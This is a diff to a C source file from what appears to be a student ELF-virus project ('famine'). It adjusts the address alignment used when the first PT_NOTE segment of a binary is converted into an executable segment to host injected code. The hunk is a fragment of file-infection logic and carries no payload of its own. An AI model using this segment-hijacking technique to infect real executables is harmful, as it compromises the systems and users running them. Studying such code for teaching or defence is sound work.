@@ -6,14 +6,14 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/11/06 09:45:03 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/06 11:50:05 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/06 12:30:43 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
 static Elf64_Phdr	*exec_segment(elf_data *data);
-static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size);
+static bool			find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size);
 
 //	Changes the first PT_NOTE segment into an executable segment that will host our code
 //
@@ -83,18 +83,19 @@ static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
 	for (size_t i = 0; i < data->elf->e_phnum; i++) {
 		seg = &data->segments[i];
 	
-		current =  seg->p_vaddr + seg->p_filesz;
-		current += seg->p_align - (current % seg->p_align);
+		current = seg->p_vaddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
 		if (current > vmax) {
 			vmax = current;
 		}
 		
-		current =  seg->p_paddr + seg->p_filesz;
-		current += seg->p_align - (current % seg->p_align);
+		current = seg->p_paddr + (((seg->p_filesz / seg->p_align) + 1) * seg->p_align);
 		if (current > pmax) {
 			pmax = current;
 		}
 	}
+
+	vmax = ((vmax / 0x1000) + 1) * 0x1000;
+	pmax = ((pmax / 0x1000) + 1) * 0x1000;
 
 	current = vmax + new_seg_size;
 	if (current < vmax) {
@@ -109,8 +110,6 @@ static bool	find_pvaddr(elf_data *data, Elf64_Phdr *note, size_t new_seg_size) {
 
 	note->p_vaddr = vmax;
 	note->p_paddr = pmax;
-
-	printf("vaddr: %lx | paddr: %lx\n", note->p_vaddr, note->p_paddr);
 
 	return false;
 }
